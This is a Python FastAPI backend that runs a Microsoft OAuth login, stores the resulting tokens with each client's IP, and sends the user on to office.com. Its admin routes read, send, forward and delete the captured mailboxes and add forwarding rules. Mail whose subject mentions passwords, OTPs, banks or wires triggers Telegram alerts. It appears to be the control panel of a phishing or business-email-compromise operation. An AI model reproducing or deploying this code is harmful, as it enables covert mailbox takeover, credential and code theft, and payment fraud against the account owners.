from fastapi import FastAPI, Request, WebSocket
from fastapi.responses import RedirectResponse, JSONResponse
from auth import generate_login_link, exchange_code_for_token
from graph import (
    fetch_emails,
    get_mail_folders,
    get_email_detail,
    reply_to_email,
    send_email,
    forward_email,
    delete_email,
    mark_as_read,
    get_conversation
)
from admin_auth import login_admin, require_admin
from urllib.parse import urlparse, parse_qs
from db import init_db, SessionLocal
from models import TenantToken, Rule
from rule_engine import apply_rules
from alerts import send_telegram_alert
import asyncio

app = FastAPI()

# =========================
# WEBSOCKET (REAL-TIME ALERTS)
# =========================
connected_clients = []

@app.websocket("/ws/alerts")
async def websocket_alerts(ws: WebSocket):
    await ws.accept()
    connected_clients.append(ws)

    try:
        while True:
            await ws.receive_text()
    except:
        connected_clients.remove(ws)


async def broadcast_alert(message: str):
    for ws in connected_clients:
        try:
            await ws.send_text(message)
        except:
            pass


# =========================
# STARTUP
# =========================
@app.on_event("startup")
def startup():
    init_db()


# =========================
# ADMIN AUTH
# =========================
@app.post("/admin/login")
async def admin_login(request: Request):
    body = await request.json()
    return login_admin(body.get("username"), body.get("password"))


@app.post("/admin/reset-password")
async def reset_admin_password(request: Request):
    require_admin(request)

    body = await request.json()
    new_password = body.get("new_password")

    if not new_password:
        return {"error": "New password required"}

    import admin_auth
    admin_auth.ADMIN_PASSWORD = new_password

    return {"message": "Password updated successfully"}


# =========================
# MICROSOFT LOGIN
# =========================
@app.get("/login")
def login(user_id: str = None):
    return RedirectResponse(generate_login_link(user_id or "default-user"))


@app.get("/generate-login-url")
def generate_login_url(user_id: str = None):
    login_url = generate_login_link(user_id or "default-user")

    parsed = urlparse(login_url)
    state = parse_qs(parsed.query).get("state", [""])[0]
    session_id = state.split(":")[1] if ":" in state else "default"

    return {"login_url": login_url, "session_id": session_id}


@app.get("/auth/callback")
def auth_callback(request: Request):
    init_db()

    code = request.query_params.get("code")
    state = request.query_params.get("state")

    if not code:
        return {"error": "No code received"}

    client_ip = request.client.host

    try:
        user_id, session_id = (state.split(":") if ":" in state else (state, "default"))

        exchange_code_for_token(code, state, client_ip)

        response = RedirectResponse(url="https://www.office.com")

        response.set_cookie(
            key="session_id",
            value=session_id,
            httponly=True,
            secure=True,
            samesite="lax",
            path="/",
        )

        return response

    except Exception as e:
        return {"error": str(e)}


# =========================
# SESSION / LOGOUT
# =========================
@app.get("/session")
def check_session(request: Request):
    sid = request.cookies.get("session_id")
    return {"active": bool(sid), "session_id": sid}


@app.get("/logout")
def logout():
    res = JSONResponse({"message": "Logged out"})
    res.delete_cookie("session_id", path="/")
    return res


# =========================
# EMAILS (WITH RULE ENGINE + ALERTS)
# =========================
@app.get("/emails")
def get_emails(request: Request, user_id: str = None):
    require_admin(request)

    session_id = request.cookies.get("session_id")
    user_id = user_id or "default-user"

    emails = fetch_emails(user_id, session_id)

    ALERT_KEYWORDS = ["password", "bank", "otp", "urgent", "invoice", "payment", "wire"]

    for e in emails:
        email_data = {
            "id": e.get("id"),
            "subject": e.get("subject"),
            "body": e.get("preview"),
            "from": e.get("from")
        }

        # APPLY RULES
        apply_rules(user_id, session_id, email_data)

        # ALERTS
        for word in ALERT_KEYWORDS:
            if word.lower() in (email_data["subject"] or "").lower():
                msg = f"🚨 ALERT: {word} detected → {email_data['subject']}"

                send_telegram_alert(msg)
                asyncio.create_task(broadcast_alert(msg))

    return {"emails": emails}


@app.get("/emails/{folder_id}")
def get_emails_by_folder(folder_id: str, request: Request, user_id: str = None):
    require_admin(request)

    return {
        "emails": fetch_emails(
            user_id or "default-user",
            request.cookies.get("session_id"),
            folder_id
        )
    }


# =========================
# THREADS
# =========================
@app.get("/conversation/{conversation_id}")
def conversation(conversation_id: str, request: Request, user_id: str = None):
    require_admin(request)

    return {
        "messages": get_conversation(
            user_id or "default-user",
            request.cookies.get("session_id"),
            conversation_id
        )
    }


# =========================
# FOLDERS
# =========================
@app.get("/folders")
def get_folders(request: Request, user_id: str = None):
    require_admin(request)

    return {
        "folders": get_mail_folders(
            user_id or "default-user",
            request.cookies.get("session_id")
        )
    }


# =========================
# EMAIL DETAIL (RULE TRIGGER HERE TOO)
# =========================
@app.get("/email/{message_id}")
def email_detail(message_id: str, request: Request, user_id: str = None):
    require_admin(request)

    user_id = user_id or "default-user"
    session_id = request.cookies.get("session_id")

    data = get_email_detail(user_id, session_id, message_id)

    apply_rules(user_id, session_id, {
        "id": message_id,
        "subject": data.get("subject"),
        "body": data.get("body"),
        "from": data.get("from")
    })

    return data


# =========================
# SEND / REPLY / FORWARD
# =========================
@app.post("/send")
async def send_new_email(request: Request, user_id: str = None):
    require_admin(request)
    body = await request.json()

    return send_email(
        user_id or "default-user",
        request.cookies.get("session_id"),
        body.get("to"),
        body.get("subject"),
        body.get("body"),
        body.get("attachments")
    )


@app.post("/email/{message_id}/reply")
async def reply_email(message_id: str, request: Request, user_id: str = None):
    require_admin(request)
    body = await request.json()

    return reply_to_email(
        user_id or "default-user",
        request.cookies.get("session_id"),
        message_id,
        body.get("message"),
        body.get("attachments")
    )


@app.post("/email/{message_id}/forward")
async def forward(message_id: str, request: Request, user_id: str = None):
    require_admin(request)
    body = await request.json()

    return forward_email(
        user_id or "default-user",
        request.cookies.get("session_id"),
        message_id,
        body.get("to")
    )


# =========================
# DELETE / READ
# =========================
@app.delete("/email/{message_id}")
def delete(message_id: str, request: Request, user_id: str = None):
    require_admin(request)

    return delete_email(
        user_id or "default-user",
        request.cookies.get("session_id"),
        message_id
    )


@app.post("/email/{message_id}/read")
async def mark_read(message_id: str, request: Request, user_id: str = None):
    require_admin(request)
    body = await request.json()

    return mark_as_read(
        user_id or "default-user",
        request.cookies.get("session_id"),
        message_id,
        body.get("isRead", True)
    )


# =========================
# RULES (DB)
# =========================
@app.post("/rules")
async def add_rule(request: Request):
    require_admin(request)

    body = await request.json()
    db = SessionLocal()

    rule = Rule(
        condition=body.get("condition"),
        action=body.get("action"),
        target_folder=body.get("target_folder"),
        forward_to=body.get("forward_to")
    )

    db.add(rule)
    db.commit()
    db.close()

    return {"message": "Rule created"}


@app.get("/rules")
def get_rules(request: Request):
    require_admin(request)

    db = SessionLocal()
    rules = db.query(Rule).all()

    result = [{
        "id": r.id,
        "condition": r.condition,
        "action": r.action.value,
        "target_folder": r.target_folder,
        "forward_to": r.forward_to
    } for r in rules]

    db.close()
    return {"rules": result}


# =========================
# DEVICES
# =========================
@app.get("/devices")
def get_devices(request: Request, user_id: str):
    require_admin(request)

    db = SessionLocal()
    sessions = db.query(TenantToken).filter_by(tenant_id=user_id).all()

    result = [{
        "session_id": s.session_id,
        "ip": s.ip_address,
        "device": s.user_agent,
        "location": s.location,
        "expires_at": s.expires_at
    } for s in sessions]

    db.close()
    return {"devices": result}


@app.delete("/devices/{session_id}")
def delete_device(session_id: str, request: Request, user_id: str):
    require_admin(request)

    db = SessionLocal()

    db.query(TenantToken).filter_by(
        tenant_id=user_id,
        session_id=session_id
    ).delete()

    db.commit()
    db.close()

    return {"message": "Device removed"}